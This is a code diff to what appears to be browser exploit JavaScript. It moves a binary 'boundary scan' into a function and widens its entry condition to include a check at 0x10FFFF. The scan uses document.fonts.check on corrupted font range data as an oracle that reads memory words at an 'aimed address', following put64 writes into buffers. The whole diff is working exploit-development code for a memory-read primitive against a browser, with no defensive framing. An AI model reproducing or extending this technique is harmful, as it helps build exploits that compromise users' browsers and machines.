@@ -76,6 +76,19 @@ function start(){
 
           function setR(t){for(var ir=0;ir<bufs.length;ir++){put64(bufs[ir][0],0x20,t);}}
           function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'ERR';}}
+          function boundary(c0,c41,c1000){
+            // Any uncovered sample admits the scan. The ceiling check also
+            // admits zero-based ranges, which cover all three samples.
+            if(!(c0===false||c41===false||c1000===false||chk(0x10FFFF)===false))return null;
+            var lo=0,hi=0x10FFFF,res=-1;
+            while(lo<=hi){
+              var mid=(lo+hi)>>1;
+              var r=chk(mid);
+              if(r===null||r==='ERR')break;
+              if(r===true){res=mid;lo=mid+1;}else hi=mid-1;
+            }
+            return res;
+          }
 
           // TEST WITH STATUS=0 (baseline)
           setR(L2+0x07n);
@@ -90,21 +103,10 @@ function start(){
           var c0=chk(0),c41=chk(0x41),cFF=chk(0xFF),c1000=chk(0x1000),cFFFF=chk(0xFFFF);
           bs('S3-chk0='+c0+',chk41='+c41+',chkFF='+cFF+',chk1000='+c1000+',chkFFFF='+cFFFF);
 
-          // If any check returned false, the oracle is WORKING
-          if(c0===false||c41===false||c1000===false){
+          var boundaryResult=boundary(c0,c41,c1000);
+          if(boundaryResult!==null){
             bs('ORACLE-ALIVE');
-
-            // Do a boundary scan: largest covered c = the TO word of the u32
-            // pair at the aimed address (CAL38 range semantics; no chk(0) gate),
-            // as fixed for the main-dir probes in the 2026-11-19 polarity repair.
-            var lo=0,hi=0x10FFFF,res=-1;
-            while(lo<=hi){
-              var mid=(lo+hi)>>1;
-              var r=chk(mid);
-              if(r===null||r==='ERR')break;
-              if(r===true){res=mid;lo=mid+1;}else hi=mid-1;
-            }
-            bs('BOUNDARY-'+res.toString(16));
+            bs('BOUNDARY-'+boundaryResult.toString(16));
           } else {
             bs('ORACLE-STILL-DEAD');
             // Try other status values
